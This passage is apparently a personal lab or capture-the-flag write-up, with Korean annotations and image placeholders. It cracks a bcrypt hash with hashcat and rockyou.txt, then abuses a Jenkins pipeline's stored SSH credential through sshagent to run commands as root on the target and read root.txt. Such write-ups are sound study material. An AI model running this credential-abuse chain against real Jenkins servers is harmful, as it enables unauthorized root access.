hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (10710 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
                                                          

```

jennifer 로그인 후 pipe 생성
![[Pasted image 20260317161732.png]]

pipeline script
![[Pasted image 20260317162126.png]]

sample 사용 결과
![[Pasted image 20260317161915.png]]

파이프라인 poc 사용
```bash

node {
  sshagent (credentials: ['deploy-dev']) {
    sh 'ssh -o StrictHostKeyChecking=no -l cloudbees 192.168.1.106 uname -a'
  }
}

```

에러 확인
![[Pasted image 20260317162715.png]]


자격증명 확인
![[Pasted image 20260317162834.png]]

script 수정
```bash
node {
  sshagent (credentials: ['1']) {
    sh 'ssh -o StrictHostKeyChecking=no -l root 10.129.230.220 uname -a'
  }
}
```

uname 출력 확인
![[Pasted image 20260317165013.png]]

root.txt 획득 
```bash
node {
  sshagent (credentials: ['1']) {
    sh 'ssh -o StrictHostKeyChecking=no -l root 10.129.230.220 "cat /root/root.txt; ip addr"'
  }
}
```
![[Pasted image 20260317165726.png]]
